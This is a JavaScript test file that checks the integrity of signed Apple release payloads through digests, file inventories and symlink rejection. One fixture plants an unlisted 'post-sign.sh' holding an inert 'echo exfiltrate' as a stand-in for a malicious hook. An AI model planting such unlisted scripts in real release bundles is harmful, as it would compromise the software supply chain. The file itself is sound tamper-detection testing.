  return stats.every((stat) => stat.isFile() && !stat.isSymbolicLink());
}

async function createPayload(files) {
  const directory = await mkdtemp(join(tmpdir(), "zuuli-apple-payload-test."));
  for (const [name, contents] of Object.entries(files)) {
    await writeFile(join(directory, name), contents);
  }
  const members = Object.keys(files);
  const checksums = shasum(directory, members);
  assert.equal(checksums.status, 0, checksums.stderr);
  await writeFile(join(directory, "CHECKSUMS.sha256"), checksums.stdout);
  const manifest = shasum(directory, ["CHECKSUMS.sha256"]);
  assert.equal(manifest.status, 0, manifest.stderr);
  return { directory, digest: manifest.stdout.trim().split(/\s+/)[0] };
}

test("canonical payload digest rejects tampered ExportOptions and checksum manifest", async (context) => {
  const payload = await createPayload({
    "ZUULI.xcarchive.zip": "archive",
    "ExportOptions.plist": "reviewed export options",
    "source-record.json": "source",
  });
  context.after(() => rm(payload.directory, { recursive: true, force: true }));
  assert.equal(verifyCanonicalPayload(payload.directory, payload.digest), true);
  await writeFile(join(payload.directory, "ExportOptions.plist"), "tampered export options");
  assert.equal(verifyCanonicalPayload(payload.directory, payload.digest), false);
  const regenerated = shasum(payload.directory, [
    "ZUULI.xcarchive.zip",
    "ExportOptions.plist",
    "source-record.json",
  ]);
  await writeFile(join(payload.directory, "CHECKSUMS.sha256"), regenerated.stdout);
  assert.equal(verifyCanonicalPayload(payload.directory, payload.digest), false);
});

test("canonical payload digest rejects a tampered macOS shipping layout", async (context) => {
  const payload = await createPayload({
    "ZUULI.app.zip": "app",
    "ZUULI-layout.dmg": "reviewed layout",
    "source-record.json": "source",
  });
  context.after(() => rm(payload.directory, { recursive: true, force: true }));
  assert.equal(verifyCanonicalPayload(payload.directory, payload.digest), true);
  await writeFile(join(payload.directory, "ZUULI-layout.dmg"), "tampered layout");
  assert.equal(verifyCanonicalPayload(payload.directory, payload.digest), false);
});

test("canonical member inventory rejects an unmanifested post-sign script", async (context) => {
  const payload = await createPayload({
    "ZUULI.xcarchive.zip": "archive",
    "ExportOptions.plist": "reviewed export options",
    "source-record.json": "source",
  });
  context.after(() => rm(payload.directory, { recursive: true, force: true }));
  const expected = [
    "CHECKSUMS.sha256",
    "ExportOptions.plist",
    "ZUULI.xcarchive.zip",
    "source-record.json",
  ];
  assert.equal(await hasExactMembers(payload.directory, expected), true);
  await writeFile(join(payload.directory, "post-sign.sh"), "echo exfiltrate");
  assert.equal(await hasExactMembers(payload.directory, expected), false);
});

test("canonical member inventory rejects a symlink in place of an expected file", async (context) => {
  const payload = await createPayload({
    "ZUULI.xcarchive.zip": "archive",
    "ExportOptions.plist": "reviewed export options",
    "source-record.json": "source",
  });
  context.after(() => rm(payload.directory, { recursive: true, force: true }));
  const expected = [
    "CHECKSUMS.sha256",
    "ExportOptions.plist",
    "ZUULI.xcarchive.zip",
    "source-record.json",
  ];
  await rm(join(payload.directory, "ExportOptions.plist"));
  await symlink("source-record.json", join(payload.directory, "ExportOptions.plist"));
  assert.equal(await hasExactMembers(payload.directory, expected), false);
});
